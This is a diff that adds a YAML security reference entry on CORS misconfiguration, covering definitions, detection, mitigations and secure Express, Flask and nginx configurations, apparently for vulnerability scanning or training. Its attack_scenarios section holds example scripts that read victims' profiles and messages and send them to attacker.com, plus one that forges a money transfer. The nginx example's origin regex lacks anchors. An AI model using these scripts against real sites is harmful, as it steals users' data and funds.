@@ -1,0 +1,322 @@
+vulnerability:
+  name: CORS Misconfiguration
+  category: A05:2021 - Security Misconfiguration
+  cwe: CWE-942
+  owasp_api: API8:2023 - Security Misconfiguration
+  
+definition: |
+  Cross-Origin Resource Sharing (CORS) misconfiguration occurs when web applications
+  improperly configure CORS policies, allowing unauthorized domains to access
+  sensitive resources. This can lead to data theft, credential leakage, and
+  unauthorized actions on behalf of authenticated users.
+
+common_patterns:
+  - Wildcard (*) origin with credentials
+  - Reflecting arbitrary Origin header
+  - Null origin allowed
+  - Overly permissive origin whitelist
+  - Regex bypass in origin validation
+  - Pre-flight request bypass
+  - Missing origin validation
+  - Trusting subdomains blindly
+  - Allowing file:// or data:// origins
+  - Improper handling of multiple origins
+
+preconditions:
+  - Application uses CORS headers
+  - Sensitive data or operations accessible via API
+  - User authentication with cookies or tokens
+  - CORS policy improperly configured
+  - Origin validation weak or missing
+
+exploitation_requirements:
+  - Ability to host malicious website
+  - Victim must visit attacker's site while authenticated
+  - Understanding of CORS mechanism
+  - JavaScript knowledge for exploitation
+  - Ability to craft cross-origin requests
+
+false_positive_indicators:
+  - Strict origin whitelist properly implemented
+  - No wildcard with credentials
+  - Proper origin validation (exact match)
+  - Pre-flight requests properly handled
+  - Credentials not allowed for sensitive endpoints
+  - Null origin explicitly rejected
+  - Proper regex validation without bypasses
+  - Security headers properly configured
+
+cors_headers:
+  response_headers:
+    - "Access-Control-Allow-Origin: Specifies allowed origin"
+    - "Access-Control-Allow-Credentials: Allows credentials"
+    - "Access-Control-Allow-Methods: Allowed HTTP methods"
+    - "Access-Control-Allow-Headers: Allowed request headers"
+    - "Access-Control-Max-Age: Pre-flight cache duration"
+    - "Access-Control-Expose-Headers: Headers exposed to client"
+  request_headers:
+    - "Origin: Request origin"
+    - "Access-Control-Request-Method: Pre-flight method"
+    - "Access-Control-Request-Headers: Pre-flight headers"
+
+common_misconfigurations:
+  wildcard_with_credentials:
+    vulnerable: |
+      Access-Control-Allow-Origin: *
+      Access-Control-Allow-Credentials: true
+    description: "Cannot use wildcard with credentials (browsers reject)"
+    impact: "Configuration error, but indicates poor security"
+  
+  reflected_origin:
+    vulnerable: |
+      # Server reflects any Origin header
+      Origin: https://evil.com
+      Response:
+        Access-Control-Allow-Origin: https://evil.com
+        Access-Control-Allow-Credentials: true
+    description: "Server trusts any origin"
+    impact: "CRITICAL - Complete CORS bypass"
+  
+  null_origin:
+    vulnerable: |
+      Origin: null
+      Response:
+        Access-Control-Allow-Origin: null
+        Access-Control-Allow-Credentials: true
+    description: "Null origin allowed (sandboxed iframes)"
+    impact: "HIGH - Attacker can use sandboxed iframe"
+  
+  subdomain_wildcard:
+    vulnerable: |
+      # Regex: ^https://.*\.example\.com$
+      Origin: https://evil.example.com
+      # Or: https://example.com.evil.com
+    description: "Weak regex allows subdomain bypass"
+    impact: "HIGH - Attacker can use compromised subdomain"
+  
+  protocol_bypass:
+    vulnerable: |
+      # Validation only checks domain, not protocol
+      Origin: http://example.com  # Instead of https://
+    description: "HTTP origin allowed for HTTPS site"
+    impact: "MEDIUM - Man-in-the-middle possible"
+
+attack_scenarios:
+  credential_theft:
+    description: "Steal authentication tokens or session cookies"
+    exploit: |
+      <!-- Attacker's page -->
+      <script>
+      fetch('https://victim.com/api/user/profile', {
+        credentials: 'include'
+      })
+      .then(r => r.json())
+      .then(data => {
+        // Send stolen data to attacker
+        fetch('https://attacker.com/steal', {
+          method: 'POST',
+          body: JSON.stringify(data)
+        });
+      });
+      </script>
+  
+  sensitive_data_exfiltration:
+    description: "Extract sensitive user data"
+    exploit: |
+      <script>
+      // Read private messages
+      fetch('https://victim.com/api/messages', {
+        credentials: 'include'
+      })
+      .then(r => r.json())
+      .then(messages => {
+        // Exfiltrate to attacker server
+        navigator.sendBeacon('https://attacker.com/log', 
+          JSON.stringify(messages));
+      });
+      </script>
+  
+  unauthorized_actions:
+    description: "Perform actions on behalf of victim"
+    exploit: |
+      <script>
+      // Transfer money, change settings, etc.
+      fetch('https://victim.com/api/transfer', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          to: 'attacker',
+          amount: 1000
+        })
+      });
+      </script>
+
+detection_methods:
+  - Test with arbitrary Origin header
+  - Test with null Origin
+  - Test with subdomain variations
+  - Test protocol variations (http vs https)
+  - Test with credentials flag
+  - Pre-flight request testing
+  - Regex bypass testing
+  - Multiple origin testing
+  - File:// and data:// origin testing
+
+mitigation:
+  - Implement strict origin whitelist
+  - Use exact string matching for origins
+  - Never reflect Origin header without validation
+  - Reject null origin
+  - Don't use wildcard (*) with credentials
+  - Validate protocol (https only for production)
+  - Implement proper regex if needed (with anchors)
+  - Limit allowed methods and headers
+  - Set appropriate Max-Age for pre-flight
+  - Use SameSite cookie attribute
+  - Implement CSRF tokens for state-changing operations
+  - Regular security audits of CORS configuration
+  - Monitor and log CORS-related errors
+  - Consider using CORS middleware/libraries
+  - Document allowed origins and rationale
+
+severity_factors:
+  critical:
+    - Arbitrary origin reflection with credentials
+    - Sensitive data accessible (PII, financial)
+    - Administrative operations exposed
+    - Authentication tokens accessible
+  high:
+    - Null origin allowed with credentials
+    - Subdomain bypass possible
+    - User data accessible
+    - State-changing operations possible
+  medium:
+    - Limited data exposure
+    - Requires additional conditions
+    - Only affects specific endpoints
+    - Non-sensitive data accessible
+  low:
+    - Public data only
+    - No credentials involved
+    - Minimal security impact
+
+business_impact:
+  - Data breaches and privacy violations
+  - Account takeover
+  - Financial fraud
+  - Unauthorized transactions
+  - Compliance violations (GDPR, PCI DSS)
+  - Reputational damage
+  - Legal liabilities
+  - Customer trust erosion
+
+compliance_considerations:
+  - GDPR: Article 32 (Security of processing)
+  - PCI DSS: Requirement 6.5.9, 6.5.10
+  - SOC 2: CC6.1, CC6.6
+  - ISO 27001: A.14.2.5
+  - NIST: AC-3, SC-7
+
+remediation_priority: HIGH
+
+testing_tools:
+  - Burp Suite (CORS testing)
+  - OWASP ZAP
+  - CORStest (automated CORS testing)
+  - Postman (manual testing)
+  - curl (command-line testing)
+  - Browser DevTools (Network tab)
+
+secure_configuration_examples:
+  nodejs_express:
+    - |
+      const cors = require('cors');
+      
+      const corsOptions = {
+        origin: function (origin, callback) {
+          const whitelist = [
+            'https://app.example.com',
+            'https://admin.example.com'
+          ];
+          if (whitelist.indexOf(origin) !== -1 || !origin) {
+            callback(null, true);
+          } else {
+            callback(new Error('Not allowed by CORS'));
+          }
+        },
+        credentials: true,
+        methods: ['GET', 'POST'],
+        allowedHeaders: ['Content-Type', 'Authorization'],
+        maxAge: 86400
+      };
+      
+      app.use(cors(corsOptions));
+  
+  python_flask:
+    - |
+      from flask_cors import CORS
+      
+      ALLOWED_ORIGINS = [
+        'https://app.example.com',
+        'https://admin.example.com'
+      ]
+      
+      CORS(app, 
+        origins=ALLOWED_ORIGINS,
+        supports_credentials=True,
+        methods=['GET', 'POST'],
+        allow_headers=['Content-Type', 'Authorization'],
+        max_age=86400
+      )
+  
+  nginx:
+    - |
+      # Nginx configuration
+      set $cors_origin "";
+      if ($http_origin ~* (https://app\.example\.com|https://admin\.example\.com)) {
+        set $cors_origin $http_origin;
+      }
+      
+      add_header Access-Control-Allow-Origin $cors_origin always;
+      add_header Access-Control-Allow-Credentials true always;
+      add_header Access-Control-Allow-Methods "GET, POST" always;
+      add_header Access-Control-Allow-Headers "Content-Type, Authorization" always;
+
+security_best_practices:
+  - "Use explicit origin whitelist, never wildcard with credentials"
+  - "Implement exact string matching for origin validation"
+  - "Reject null origin explicitly"
+  - "Validate protocol (enforce HTTPS in production)"
+  - "Limit allowed methods to minimum required"
+  - "Limit allowed headers to minimum required"
+  - "Set appropriate Max-Age (24 hours typical)"
+  - "Use SameSite=Strict or Lax for cookies"
+  - "Implement CSRF tokens for state-changing operations"
+  - "Regular audits of CORS configuration"
+  - "Monitor CORS-related errors and attacks"
+  - "Document all allowed origins with business justification"
+  - "Use CORS middleware/libraries instead of manual implementation"
+  - "Test CORS configuration in staging before production"
+
+prevention_checklist:
+  - "[ ] Explicit origin whitelist implemented"
+  - "[ ] No wildcard (*) with credentials"
+  - "[ ] Origin validation uses exact matching"
+  - "[ ] Null origin explicitly rejected"
+  - "[ ] Protocol validation enforced (HTTPS)"
+  - "[ ] Allowed methods limited to required"
+  - "[ ] Allowed headers limited to required"
+  - "[ ] SameSite cookie attribute set"
+  - "[ ] CSRF tokens implemented"
+  - "[ ] Pre-flight requests properly handled"
+  - "[ ] CORS errors logged and monitored"
+  - "[ ] Regular security audits performed"
+
+references:
+  - "OWASP CORS Misconfiguration"
+  - "MDN Web Docs: CORS"
+  - "W3C CORS Specification"
+  - "PortSwigger: CORS Vulnerabilities"
+  - "CWE-942: Overly Permissive Cross-domain Whitelist"
+
